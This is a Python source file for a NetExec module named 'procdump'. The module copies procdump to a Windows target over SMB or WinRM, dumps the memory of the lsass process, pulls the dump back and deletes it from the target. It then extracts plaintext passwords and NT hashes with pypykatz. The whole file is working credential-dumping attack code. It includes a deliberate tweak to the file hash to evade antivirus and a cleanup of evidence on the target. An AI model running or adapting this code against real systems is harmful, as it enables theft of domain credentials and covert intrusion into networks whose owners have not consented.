# prdocdump module for nxc python3
# thanks to pixis (@HackAndDo) for making it pretty l33t :)
# WinRM adition to the module by @SoftAndoWetto
# v0.4

import re
from pypykatz.pypykatz import pypykatz
from nxc.helpers.bloodhound import add_user_bh
from nxc.helpers.misc import CATEGORY
from nxc.paths import DATA_PATH, TMP_PATH
from os.path import abspath, join
from datetime import datetime


class NXCModule:
    name = "procdump"
    description = "Get lsass dump using procdump64 and parse the result with pypykatz"
    supported_protocols = ["smb", "winrm"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def options(self, context, module_options):
        r"""
        TMP_DIR             Path where process dump should be saved on target system (default: C:\\Windows\\Temp\\)
        PROCDUMP_PATH       Path where procdump.exe is on your system (default: /tmp/), if changed embeded version will not be used
        PROCDUMP_EXE_NAME   Name of the procdump executable (default: procdump.exe), if changed embeded version will not be used
        DIR_RESULT          Location where the dmp are stored (default: DIR_RESULT = PROCDUMP_PATH)
        """
        self.tmp_dir = "C:\\Windows\\Temp\\"
        with open(join(DATA_PATH, "procdump/procdump.exe"), "rb") as f:
            self.procdump_embeded = f.read()
        self.procdump = "procdump.exe"
        self.procdump_path = abspath(TMP_PATH)
        self.dir_result = self.procdump_path
        self.useembeded = True
        # Add some random binary data to defeat AVs which check the file hash
        self.procdump_embeded += datetime.now().strftime("%Y%m%d%H%M%S").encode()

        if "PROCDUMP_PATH" in module_options:
            self.procdump_path = module_options["PROCDUMP_PATH"]
            self.useembeded = False

        if "PROCDUMP_EXE_NAME" in module_options:
            self.procdump = module_options["PROCDUMP_EXE_NAME"]
            self.useembeded = False

        if "TMP_DIR" in module_options:
            self.tmp_dir = module_options["TMP_DIR"]

        if "DIR_RESULT" in module_options:
            self.dir_result = module_options["DIR_RESULT"]

        if context.protocol == "smb":
            self.share = "C$"
            self.tmp_share = self.tmp_dir.split(":")[1]

    def on_admin_login(self, context, connection):
        if self.useembeded is True:
            with open(self.procdump_path + self.procdump, "wb") as procdump:
                procdump.write(self.procdump_embeded)

        context.log.display(f"Copy {self.procdump_path + self.procdump} to {self.tmp_dir}")
        if context.protocol == "smb":
            with open(self.procdump_path + self.procdump, "rb") as procdump:
                try:
                    connection.conn.putFile(self.share, self.tmp_share + self.procdump, procdump.read)
                    context.log.success(f"Created file {self.procdump} on the \\\\{self.share}{self.tmp_share}")
                except Exception as e:
                    context.log.fail(f"Error writing file to share {self.share}: {e}")
        elif context.protocol == "winrm":
            try:
                connection.conn.copy(self.procdump_path + self.procdump, self.tmp_dir + self.procdump)
                context.log.success(f"Created file {self.procdump} on {self.tmp_dir}")
            except Exception as e:
                context.log.fail(f"Error uploading file to {self.tmp_dir}: {e}")

        # get pid lsass
        context.log.display("Getting lsass PID")
        if context.protocol == "smb":
            p = connection.execute('tasklist /v /fo csv | findstr /i "lsass"', True)
            if not p:
                context.log.fail("Failed getting lsass.exe PID")
                self.delete_procdump_binary(connection, context)
                return
            pid = p.split(",")[1][1:-1]
            command = f"{self.tmp_dir}{self.procdump} -accepteula -ma {pid} {self.tmp_dir}%COMPUTERNAME%-%PROCESSOR_ARCHITECTURE%-%USERDOMAIN%.dmp"
        elif context.protocol == "winrm":
            p = connection.execute("(Get-Process lsass).Id", True, shell_type="powershell")
            if not p:
                context.log.fail("Failed getting lsass.exe PID")
                self.delete_procdump_binary(connection, context)
                return
            pid = p.strip()
            command = f'& "{self.tmp_dir}{self.procdump}" -accepteula -ma {pid} "{self.tmp_dir}$env:COMPUTERNAME-$env:PROCESSOR_ARCHITECTURE-$env:USERDOMAIN.dmp"'

        context.log.display(f"Executing command {command}")
        if context.protocol == "smb":
            p = connection.execute(command, True)
        elif context.protocol == "winrm":
            p = connection.execute(command, True, shell_type="powershell")

        if "Dump 1 complete" not in p:
            context.log.fail("Process lsass.exe error while dumping, try with verbose")
            self.delete_procdump_binary(connection, context)
            return
        else:
            context.log.success("Process lsass.exe was successfully dumped")
            regex = r"([A-Za-z0-9-]*.dmp)"
            matches = re.search(regex, str(p), re.MULTILINE)
            machine_name = ""
            if matches:
                machine_name = matches.group()
            else:
                context.log.display("Error getting the lsass.dmp file name")
                return

            context.log.display(f"Copy {machine_name} to host")

            if context.protocol == "smb":
                with open(abspath(join(self.dir_result, machine_name)), "wb+") as dump_file:
                    try:
                        connection.conn.getFile(self.share, self.tmp_share + machine_name, dump_file.write)
                        context.log.success(f"Dumpfile of lsass.exe was transferred to {abspath(join(self.dir_result, machine_name))}")
                    except Exception as e:
                        context.log.fail(f"Error while get file: {e}")
            elif context.protocol == "winrm":
                try:
                    connection.conn.fetch(self.tmp_dir + machine_name, abspath(join(self.dir_result, machine_name)))
                    context.log.success(f"Dumpfile of lsass.exe was transferred to {abspath(join(self.dir_result, machine_name))}")
                except Exception as e:
                    context.log.fail(f"Error while get file: {e}")

            self.delete_procdump_binary(connection, context)

            if context.protocol == "smb":
                try:
                    connection.conn.deleteFile(self.share, self.tmp_share + machine_name)
                    context.log.success(f"Deleted lsass.dmp file on the {self.share} share")
                except Exception as e:
                    context.log.fail(f"Error deleting lsass.dmp file on share {self.share}: {e}")
            elif context.protocol == "winrm":
                try:
                    connection.execute(f'Remove-Item -Path "{self.tmp_dir + machine_name}" -Force', True, shell_type="powershell")
                    context.log.success(f"Deleted lsass.dmp file on {self.tmp_dir}")
                except Exception as e:
                    context.log.fail(f"Error deleting lsass.dmp file on {self.tmp_dir}: {e}")

            with open(abspath(join(self.dir_result, machine_name)), "rb") as dump:
                try:
                    credz_bh = []
                    try:
                        pypy_parse = pypykatz.parse_minidump_external(dump)
                    except Exception as e:
                        context.log.fail(f"Error parsing minidump: {e}")
                        return

                    ssps = [
                        "msv_creds",
                        "wdigest_creds",
                        "ssp_creds",
                        "livessp_creds",
                        "kerberos_creds",
                        "credman_creds",
                        "tspkg_creds",
                    ]
                    for luid in pypy_parse.logon_sessions:
                        for ssp in ssps:
                            for cred in getattr(pypy_parse.logon_sessions[luid], ssp, []):
                                domain = getattr(cred, "domainname", None)
                                username = getattr(cred, "username", None)
                                password = getattr(cred, "password", None)
                                NThash = getattr(cred, "NThash", None)
                                if NThash is not None:
                                    NThash = NThash.hex()
                                if username and (password or NThash) and "$" not in username:
                                    print_pass = password if password else NThash
                                    context.log.highlight(domain + "\\" + username + ":" + print_pass)
                                    if "." not in domain and domain.upper() in connection.domain.upper():
                                        domain = connection.domain
                                        credz_bh.append(
                                            {
                                                "username": username.upper(),
                                                "domain": domain.upper(),
                                            }
                                        )
                    if len(credz_bh) > 0:
                        add_user_bh(credz_bh, None, context.log, connection.config)
                except Exception as e:
                    context.log.fail("Error openning dump file", str(e))

    def delete_procdump_binary(self, connection, context):
        if context.protocol == "smb":
            try:
                connection.conn.deleteFile(self.share, self.tmp_share + self.procdump)
                context.log.success(f"Deleted procdump file on the {self.share} share")
            except Exception as e:
                context.log.fail(f"Error deleting procdump file on share {self.share}: {e}")
        elif context.protocol == "winrm":
            try:
                connection.execute(f'Remove-Item -Path "{self.tmp_dir + self.procdump}" -Force', True, shell_type="powershell")
                context.log.success(f"Deleted procdump file on {self.tmp_dir}")
            except Exception as e:
                context.log.fail(f"Error deleting procdump file on {self.tmp_dir}: {e}")
